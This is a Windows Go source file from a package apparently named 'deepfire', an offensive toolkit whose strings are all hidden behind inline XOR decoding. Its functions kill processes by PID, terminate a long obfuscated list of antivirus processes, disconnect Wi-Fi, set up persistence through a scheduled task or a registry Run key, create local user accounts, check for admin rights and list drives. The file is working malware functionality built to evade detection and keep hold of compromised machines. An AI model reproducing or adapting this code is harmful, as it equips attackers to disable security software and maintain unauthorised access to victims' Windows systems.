//go:build windows
// +build windows

package deepfire

import (
	"fmt"
	"log"
	"os"

	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func killProcByPID(pid int) error {
	kernel32dll := windows.NewLazyDLL((func() string {
mask := []byte("\x43\xfd\xea\x8c\xa7\x9b\x75\x23\xfe\xe6\xe3\x2f")
maskedStr := []byte("\x08\x98\x98\xe2\xc2\xf7\x46\x11\xd0\x82\x8f\x43")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	OpenProcess := kernel32dll.NewProc((func() string {
mask := []byte("\x43\xe0\x65\xbd\xca\xd1\xd8\x44\x1a\x37\x2c")
maskedStr := []byte("\x0c\x90\x00\xd3\x9a\xa3\xb7\x27\x7f\x44\x5f")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	TerminateProcess := kernel32dll.NewProc((func() string {
mask := []byte("\xf8\xb3\x17\x83\x0e\x12\xdb\x23\x90\x83\x9c\xbf\x7d\x16\x5e\x28")
maskedStr := []byte("\xac\xd6\x65\xee\x67\x7c\xba\x57\xf5\xd3\xee\xd0\x1e\x73\x2d\x5b")
res := make([]byte, 16)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	op, _, _ := OpenProcess.Call(0x0001, 1, uintptr(pid))
	//protip:too much error handling can screw things up
	_, _, err2 := TerminateProcess.Call(op, 9)
	return err2
}

func isRoot() bool {
	root := true

	_, err := os.Open((func() string {
mask := []byte("\xca\x6e\x86\xe0\x09\x61\x71\xe5\x00\x4d\xce\xe1\x8a\xa8\xbd\xb1\xd5\xc4")
maskedStr := []byte("\x96\x32\xa8\xbc\x59\x29\x28\xb6\x49\x0e\x8f\xad\xce\xfa\xf4\xe7\x90\xf4")
res := make([]byte, 18)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		root = false
	}

	return root
}

func info() string {
	user, err := cmdOut((func() string {
mask := []byte("\xf2\xef\x0b\xee\x07\x6a\x12\x2f\xb1\x2b")
maskedStr := []byte("\x83\x9a\x6e\x9c\x7e\x4a\x67\x5c\xd4\x59")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	if err != nil {
		user = (func() string {
mask := []byte("\x5d\x0b\xc4")
maskedStr := []byte("\x13\x24\x85")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	}

	// o, err := cmdOut("ipconfig")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }

	// entries := strings.Split(o, "\n")

	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "Default") {
	// 		ap_ip = strings.Split(entry, ":")[1] // (1)
	// 	}
	// }

	return user
}

func pkillAv() error {
	av_processes := []string{
		(func() string {
mask := []byte("\xd3\xe0\x9a\xc6\xdc\x25\x75\x87\xc8\xb2")
maskedStr := []byte("\xb2\x84\xec\xa5\xb4\x4e\x5b\xe2\xb0\xd7")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x7b\xae\x6a\xc8\x3c\xf9\x2a\xc6\xd7")
maskedStr := []byte("\x1a\xc6\x04\xbb\x58\xd7\x4f\xbe\xb2")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xbd\x6d\x88\x91\x82\xab\x01\xa0\x3c\x3e\xe2\x5b")
maskedStr := []byte("\xdc\x01\xed\xe3\xf6\xd8\x77\xc3\x12\x5b\x9a\x3e")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x22\xb9\xf4\x40\x13\x27\x6d\x10\xc5\x81\xee\x91\xf9")
maskedStr := []byte("\x43\xd5\x81\x2e\x7c\x53\x04\x76\xbc\xaf\x8b\xe9\x9c")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x6d\x00\x02\xec\x77\xbf\xd4\xb4\x62\x00\x25\x78")
maskedStr := []byte("\x0c\x75\x76\x83\x13\xd0\xa3\xda\x4c\x65\x5d\x1d")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x5e\x06\xb0\x47\x3b\x35\xd7\x29\xe8\xd8\x9d\x5f")
maskedStr := []byte("\x3f\x70\xdd\x26\x52\x46\xa5\x5f\xc6\xbd\xe5\x3a")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x04\x11\x02\x6b\xde\x9e\x4f\x4b\xf9")
maskedStr := []byte("\x65\x67\x72\x08\xbd\xb0\x2a\x33\x9c")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x97\x75\x01\xb6\x49\xe5\x48\xff")
maskedStr := []byte("\xf6\x03\x71\xdb\x67\x80\x30\x9a")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x34\x2a\xe6\xcf\x5d\x85\x6d\xf8\x35\x8c\xea\x04\xb3")
maskedStr := []byte("\x55\x5c\x95\xac\x35\xe0\x09\xcb\x07\xa2\x8f\x7c\xd6")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x10\x5b\x07\x80\x3b\xd5\x69\x4e\xd2\xa5\x9f\x6a")
maskedStr := []byte("\x71\x2d\x70\xf5\x4b\xa6\x1b\x38\xfc\xc0\xe7\x0f")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x38\x77\x58\x5c\x79\xeb\x03\x30\x5c\x5d")
maskedStr := []byte("\x5a\x13\x35\x3f\x16\x85\x2d\x55\x24\x38")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x7d\x47\xd1\xd3\xae\xc2\xe8\xb5\x69\x35\x58\xd5")
maskedStr := []byte("\x1f\x23\xbf\xb2\xc9\xa7\x86\xc1\x47\x50\x20\xb0")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xc2\x91\x80\x4e\x1b\x87\x92\xb2\x60\x69\x02")
maskedStr := []byte("\xa0\xf5\xef\x2b\x68\xf5\xe4\x9c\x05\x11\x67")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x6f\x47\x1b\x89\x14\x7e\x4f\xe4")
maskedStr := []byte("\x0d\x23\x68\xfa\x3a\x1b\x37\x81")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xf9\xf0\x4d\xbd\x76\x72\x36\xf3\xd8\xb8\x4d\xaa")
maskedStr := []byte("\x9b\x94\x3e\xca\x1f\x06\x55\x9b\xf6\xdd\x35\xcf")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xd6\xd4\xe9\x99\xdb\x35\x1d\xb0\xc7\xa0\x8a\x18\xe2\x66\x65\xd4\xa4\xfd\x46\x7b\x38\xa3\x6c\x76\x2e\x87\xce")
maskedStr := []byte("\xb4\xbd\x9d\xfd\xbe\x53\x78\xde\xa3\xc5\xf8\x47\x92\x54\x15\x8b\xd7\x89\x27\x09\x4c\xd6\x1c\x58\x4b\xff\xab")
res := make([]byte, 27)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x9d\x1c\xf7\x87\xd8\x0e\xd4\x6b\x3d\x01")
maskedStr := []byte("\xfe\x7d\x81\xf5\xb1\x6a\xfa\x0e\x45\x64")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x84\x6c\xde\xf7\x72\xc4\xcc\xae\xc4\xf4\x35")
maskedStr := []byte("\xe7\x0d\xa8\x83\x00\xa5\xb5\x80\xa1\x8c\x50")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xbd\xdc\xa5\x69\x4f\xff\x98\x7d\x30\xbe\x40\xe7")
maskedStr := []byte("\xde\xb1\xc2\x1b\x2b\x96\xf9\x13\x1e\xdb\x38\x82")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x39\xf6\xfd\x52\x19\xd9\x51\xb4\x04\x22")
maskedStr := []byte("\x5d\x99\x8e\x31\x78\xb7\x7f\xd1\x7c\x47")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x5c\x93\x07\x7d\xb9\xf0\x5d\x53\x67\x6e")
maskedStr := []byte("\x38\xe5\x77\x1c\xc9\x99\x73\x36\x1f\x0b")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xaa\xcf\x28\x16\x14\x2c\x28\x5a\xb9\x20\xd3\x8c\x42\xfc\x6d\xe5\x68\x47\x84\xbf")
maskedStr := []byte("\xcc\xbd\x49\x7b\x71\x5b\x47\x28\xd2\x53\xb6\xfe\x34\x95\x0e\x80\x46\x22\xfc\xda")
res := make([]byte, 20)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x4d\x9c\x55\x62\x56\x10\xae\xfc\x1e\x91\x8b\x52\x52\x49\x25\x3c\x6f\xc0\x59")
maskedStr := []byte("\x2b\xee\x34\x0f\x33\x67\xc1\x8e\x75\xe2\xee\x20\x24\x20\x46\x12\x0a\xb8\x3c")
res := make([]byte, 19)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x59\x2d\x80\x43\x29\x72\x27\x87\x55\xf6\x88\x0b\x3b")
maskedStr := []byte("\x3f\x5f\xe5\x30\x41\x11\x4b\xe6\x38\xd8\xed\x73\x5e")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xf4\xa2\x6f\x5e\x71\xa1\x06\x46\x34\x76\xe8")
maskedStr := []byte("\x9d\xc1\x0a\x2e\x10\xc2\x6d\x68\x51\x0e\x8d")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x22\x9f\x81\x2a\x33\xc2\xc3\xbc\x9d")
maskedStr := []byte("\x4b\xec\xe0\x4c\x56\xec\xa6\xc4\xf8")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x2a\x36\xb4\x92\x36\x02\x93\x54\xb9\x86\x32\xc1")
maskedStr := []byte("\x47\x51\xd5\xe4\x44\x76\xf0\x38\x97\xe3\x4a\xa4")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x0c\x75\xc4\x3b\xe4\x0a\x3f\xdf\x4e\xf6")
maskedStr := []byte("\x61\x12\xac\x4f\x89\x66\x11\xba\x36\x93")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x05\x4f\x30\x19\xa6\xe9\xe6\x55")
maskedStr := []byte("\x68\x28\x45\x70\x88\x8c\x9e\x30")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xaf\xe8\xc4\x3f\xff\xe3\x40\xc1\xa2\xe1\x05\xd7")
maskedStr := []byte("\xc1\x89\xb2\x5e\x8f\x90\x36\xa2\x8c\x84\x7d\xb2")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x77\x82\xd5\xf9\xa6\x0f\x54\xed\x96\xa0\x68\xec")
maskedStr := []byte("\x19\xed\xb1\xca\x94\x64\x26\x83\xb8\xc5\x10\x89")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xae\x57\xe3\x6a\xd2\xce\x18\x9a\xc2\x5e\x10\x3c")
maskedStr := []byte("\xc0\x38\x87\x59\xe0\xa5\x6d\xf3\xec\x3b\x68\x59")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x21\x5c\x38\xa9\xc4\x82\x76\xf9\xa9\x9b\x33\x43")
maskedStr := []byte("\x4f\x2c\x5e\xc4\xaa\xf6\x19\x8b\x87\xfe\x4b\x26")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x40\x61\xdd\x0d\x83\x9e\xde\x08\x4c\x13")
maskedStr := []byte("\x2e\x12\xb0\x69\xf7\xec\xf0\x6d\x34\x76")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x33\x82\x6a\xf4\xab\x61\x1c\xdb\xbb\x79\x84\x28")
maskedStr := []byte("\x5d\xf6\x18\x80\xd8\x02\x7d\xb5\x95\x1c\xfc\x4d")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xb7\xdc\x9a\x65\x41\x1b\xb2\x82\x7e\x20")
maskedStr := []byte("\xd8\xba\xf9\x01\x2e\x7c\x9c\xe7\x06\x45")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xb8\x63\xfc\xd5\x00\xbd\x19\xb6\xcb")
maskedStr := []byte("\xc8\x02\x88\xb6\x68\x93\x7c\xce\xae")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x0a\x64\xc1\xef\xec\x67\x09")
maskedStr := []byte("\x7a\x05\xb7\xc1\x89\x1f\x6c")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xe1\x9a\x2a\xc2\xc5\xd9\xc7\x3d\x2a\x49")
maskedStr := []byte("\x91\xf9\x59\xa1\xa4\xb7\xe9\x58\x52\x2c")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x3e\xf4\x30\xc9\x47\x2e\xec\xaa\x46\xda\x31")
maskedStr := []byte("\x4e\x9b\x40\xbb\x28\x56\x95\x84\x23\xa2\x54")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x62\x27\x4f\xad\x4c\x50\xcd\x83\x51\x37\x09")
maskedStr := []byte("\x12\x55\x2a\xdb\x3f\x22\xbb\xad\x34\x4f\x6c")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x8b\xc7\x6d\x62\xfe\xc3\xe9\x91\xe5\xe8\x4d")
maskedStr := []byte("\xf9\xa2\x0c\x0e\x93\xac\x87\xbf\x80\x90\x28")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x11\x1b\xde\x03\x23\xaa\x1e\x65\xad\x06\x23")
maskedStr := []byte("\x62\x7a\xa8\x70\x40\xcb\x70\x4b\xc8\x7e\x46")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x28\xd2\xdf\x59\x47\x52\xf2\x3f\xc7\x68")
maskedStr := []byte("\x5b\xb0\xac\x3c\x35\x24\xdc\x5a\xbf\x0d")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x50\x20\xf3\x2a\xc0\xfb\xbb\xc0\xad\x26")
maskedStr := []byte("\x23\x43\x92\x44\xf3\xc9\x95\xa5\xd5\x43")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xa6\x75\x19\x1b\xd8\x1f\xf9\xfd\x33\x10")
maskedStr := []byte("\xd5\x05\x70\x7f\xbd\x6d\xd7\x98\x4b\x75")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x2c\x15\x80\xdc\xa7\xf6\xf4\x50\x54\xf2\x3b")
maskedStr := []byte("\x58\x78\xf0\xae\xc8\x8e\x8d\x7e\x31\x8a\x5e")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xc6\xe0\x53\x4d\xe3\xb8\x49\x72\x42\x90\x71\x36")
maskedStr := []byte("\xb2\x92\x32\x34\x8a\xdb\x26\x01\x6c\xf5\x09\x53")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x82\x8d\x06\xa2\x2c\x8b\x2a\x31\x72\x9b\x7b\x56\x6b")
maskedStr := []byte("\xf7\xfd\x62\xc3\x58\xee\x58\x44\x1b\xb5\x1e\x2e\x0e")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xda\x9e\xd9\x04\x9a\xe7\x5e\x85\x25\x0b\x1d\xef")
maskedStr := []byte("\xaf\xee\xbd\x70\xf4\x91\x6c\xbd\x0b\x6e\x65\x8a")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xb8\x65\x6f\xff\xe5\x6f\x02\xa8\xe2")
maskedStr := []byte("\xce\x00\x1b\xcc\xd7\x41\x67\xd0\x87")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x9b\x18\xc2\x11\x8a\x7e\xb5\xdf\x72\x44")
maskedStr := []byte("\xed\x7d\xb6\x7c\xf9\x19\x9b\xba\x0a\x21")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x0c\xc7\x85\x43\xc5\x75\x3a\x2b\x1f\xa5")
maskedStr := []byte("\x7a\xb7\xf1\x31\xa4\x0c\x14\x4e\x67\xc0")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x75\x66\x42\x15\x03\xb3\x2f\x90\xcb\x2b")
maskedStr := []byte("\x03\x15\x31\x70\x71\xc5\x01\xf5\xb3\x4e")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x56\x8e\x2e\xb1\x98\xd0\x5d\x53\x8d\x7c\xf8\x0e")
maskedStr := []byte("\x21\xeb\x4c\xc1\xea\xbf\x25\x2a\xa3\x19\x80\x6b")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x07\x98\x60\x4e\x8d\x69\xf9\x2e\xd7\x9a\xe2\x4d")
maskedStr := []byte("\x70\xfd\x02\x3d\xee\x08\x97\x56\xf9\xff\x9a\x28")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x37\x49\xb9\x59\x5d\x2d\xc2\x7e\x50\x7b\x97\x4f")
maskedStr := []byte("\x4f\x2a\xd6\x34\x30\x5e\xb4\x0c\x7e\x1e\xef\x2a")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func wifiDisconnect() error {
	cmd := (func() string {
mask := []byte("\x06\x2b\xbc\xcb\x10\x3e\x0e\xd3\xf8\x7e\x78\xe5\x76\x1f\x21\xf9\x39\xf4\x87\x9c\x12\xe4\xad\x86\xb6\xa6\xab\x17\x44\x84\xd5\xd2\x4a\xb0\x67\xd4\x52\xee\x85\xdf\x00\xc1\xe3\x65\x76\x46\x99\x52\xdc\xa5\x26\x5c\x31\x62\xeb\xc2\xcd\xc7\x27\x12\xe4\xfc\xc5\x56\xb5\xdb\x87\x39\x94\xfb\x3d\x31\x24\xb7\x16\x4d\x6e\x51\x8e")
maskedStr := []byte("\x68\x4e\xc8\xb8\x78\x1e\x67\xbd\x8c\x1b\x0a\x83\x17\x7c\x44\xd9\x4a\x91\xf3\xbc\x7b\x8a\xd9\xe3\xc4\xc0\xca\x74\x21\xa4\xbb\xb3\x27\xd5\x5a\xf6\x05\x87\xf7\xba\x6c\xa4\x90\x16\x56\x08\xfc\x26\xab\xca\x54\x37\x11\x21\x84\xac\xa3\xa2\x44\x66\x8d\x93\xab\x74\x95\xba\xe3\x54\xfd\x95\x00\x75\x6d\xe4\x57\x0f\x22\x14\xca")
res := make([]byte, 79)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func schtaskPersistence() error {
	cmd, er := GetPath()
	if er != nil {
		log.Println(er)
	}
	_, err := cmdOut(fmt.Sprintf((func() string {
mask := []byte("\x47\x8e\xff\xc0\x58\x09\xc3\xe7\xcc\x5c\xa8\x82\x0f\xe2\x4d\xd2\x6d\xbf\x9b\x3d\x28\xd6\x65\x6d\x0a\x05\x1b\xfa\x66\x9c\xf6\x15\xce\x50\xe1\x21\x90\x9b\xa0\xde\xdb\x76\x7c\xb6\x2d\x30\xeb\xcd\x74\xe5\x19\x18\xc0\x7d\x43\xa3\x61\x20\x95\x52\x23\xec\xf0\x51\xbf\x44\x95\x27\x84\x01\xae\x48\x0c\x08\xb5\xb6\xca")
maskedStr := []byte("\x34\xed\x97\xb4\x39\x7a\xa8\x94\xec\x73\xcb\xf0\x6a\x83\x39\xb7\x4d\x90\xef\x53\x08\xf4\x28\x14\x49\x70\x68\x8e\x09\xf1\xa2\x74\xbd\x3b\xc3\x01\xbf\xe8\xc3\xfe\xb4\x18\x0f\xc2\x4c\x42\x9f\xed\x5b\x97\x6c\x38\xb3\x04\x30\xd7\x04\x4d\xb5\x7d\x57\x9e\xd0\x73\xdc\x29\xf1\x09\xe1\x79\xcb\x68\x23\x6b\x95\x93\xb9")
res := make([]byte, 77)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), cmd))
	return err
}

func startUpPersistence() error {
	path, er := GetPath()
	if er != nil {
		log.Println(er)
	}
	err := WriteRegistryKey(registry.CURRENT_USER, (func() string {
mask := []byte("\x5f\x8e\x55\x76\xa8\xa4\xd7\xc6\x11\xb0\x67\x0e\x66\x77\x4d\x4e\xdb\xeb\xdc\x05\x3b\xaa\xbb\xe8\x71\x59\xd4\x71\x53\xbe\xf4\x78\x2a\xb8\x9f\x09\xbb\x18\x2d\x89\xd7\xdf\x15\xb9\xd6")
maskedStr := []byte("\x0c\xc1\x13\x22\xff\xe5\x85\x83\x4d\xfd\x0e\x6d\x14\x18\x3e\x21\xbd\x9f\x80\x52\x52\xc4\xdf\x87\x06\x2a\x88\x32\x26\xcc\x86\x1d\x44\xcc\xc9\x6c\xc9\x6b\x44\xe6\xb9\x83\x47\xcc\xb8")
res := make([]byte, 45)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x6d\x90\x3f\x2b\xbf\xf7\xc7\x41")
maskedStr := []byte("\x1e\xff\x53\x58\xcb\x9e\xa4\x24")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), path)
	return err
}

func addPersistentCommand(persistenceType string) error {
	var err error
	if persistenceType == (func() string {
mask := []byte("\x1d\xca\xab\x52\x41\x21\x6f\xb1")
maskedStr := []byte("\x4e\xa9\xc3\x26\x20\x52\x04\xc2")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) {
		err = schtaskPersistence()
	} else if persistenceType == (func() string {
mask := []byte("\xf1\x2f\xcd\xc8\x85\xc3\xd7")
maskedStr := []byte("\xa2\x5b\xac\xba\xf1\xb6\xa7")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) {
		err = startUpPersistence()
	}
	return err
}

func CreateUser(username, password string) error {
	cmd := f((func() string {
mask := []byte("\x80\x82\xfb\x86\x14\x3e\x34\x95\x3e\x82\xe2\x14\x51\x93\xfe\xee\x0a\xf2\xfe")
maskedStr := []byte("\xee\xe7\x8f\xa6\x61\x4d\x51\xe7\x1e\xa7\x91\x34\x74\xe0\xde\xc1\x4b\xb6\xba")
res := make([]byte, 19)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range (func() string {
mask := []byte("\xde\x97\xb7\xef\x1f\x95\x5d\x8f\xe8\x59\xc9\x5e\x9b\x9d\x35\x0c\x84\x54\x7d\x7d\x30\x42\x80\xcc\x43\xa9")
maskedStr := []byte("\x9f\xd5\xf4\xab\x5a\xd3\x1a\xc7\xa1\x13\x82\x12\xd6\xd3\x7a\x5c\xd5\x06\x2e\x29\x65\x14\xd7\x94\x1a\xf3")
res := make([]byte, 26)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) {
		f, err := os.Open(string(drive) + (func() string {
mask := []byte("\x84\x3d")
maskedStr := []byte("\xbe\x61")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
		if err == nil {
			found_drives = append(found_drives, string(drive)+(func() string {
mask := []byte("\x5b\x0b")
maskedStr := []byte("\x61\x57")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
			f.Close()
		}
	}
	return found_drives, nil
}
